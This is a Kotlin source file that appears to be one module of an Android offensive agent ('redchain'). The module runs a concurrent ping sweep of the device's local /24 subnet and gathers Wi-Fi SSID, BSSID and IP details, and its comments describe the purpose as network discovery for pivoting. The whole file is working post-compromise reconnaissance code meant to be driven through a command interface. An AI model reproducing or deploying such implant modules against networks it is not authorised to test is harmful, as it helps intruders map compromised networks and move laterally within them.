package com.redchain.agent.modules

import android.content.Context
import android.net.wifi.WifiManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.net.InetAddress
import java.net.NetworkInterface

/**
 * Network discovery for pivoting
 * Discover hosts on local network
 */
object NetworkDiscoveryModule {

    suspend fun execute(params: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        val localIp = getLocalIpAddress()
        val networkPrefix = getNetworkPrefix(localIp)

        val aliveHosts = mutableListOf<String>()

        // Scan local network (e.g., 192.168.1.1-254)
        coroutineScope {
            val jobs = (1..254).map { lastOctet ->
                async {
                    val ip = "$networkPrefix.$lastOctet"
                    if (isHostAlive(ip, timeout = 500)) {
                        synchronized(aliveHosts) {
                            aliveHosts.add(ip)
                        }
                    }
                }
            }
            jobs.awaitAll()
        }

        JSONObject().apply {
            put("local_ip", localIp)
            put("network_prefix", networkPrefix)
            put("alive_hosts", JSONArray(aliveHosts))
            put("total_found", aliveHosts.size)
        }
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val networkInterface = interfaces.nextElement()
                val addresses = networkInterface.inetAddresses

                while (addresses.hasMoreElements()) {
                    val address = addresses.nextElement()
                    if (!address.isLoopbackAddress && address is java.net.Inet4Address) {
                        return address.hostAddress ?: ""
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return "0.0.0.0"
    }

    private fun getNetworkPrefix(ip: String): String {
        // Simple /24 network assumption
        val parts = ip.split(".")
        return if (parts.size == 4) {
            "${parts[0]}.${parts[1]}.${parts[2]}"
        } else {
            "192.168.1"
        }
    }

    private fun isHostAlive(ip: String, timeout: Int): Boolean {
        return try {
            val address = InetAddress.getByName(ip)
            address.isReachable(timeout)
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Get WiFi SSID for context
     */
    fun getWifiInfo(context: Context): JSONObject {
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val wifiInfo = wifiManager.connectionInfo

        return JSONObject().apply {
            put("ssid", wifiInfo.ssid)
            put("bssid", wifiInfo.bssid)
            put("ip_address", intToIp(wifiInfo.ipAddress))
            put("link_speed", wifiInfo.linkSpeed)
        }
    }

    private fun intToIp(ip: Int): String {
        return "${ip and 0xFF}.${ip shr 8 and 0xFF}.${ip shr 16 and 0xFF}.${ip shr 24 and 0xFF}"
    }
}
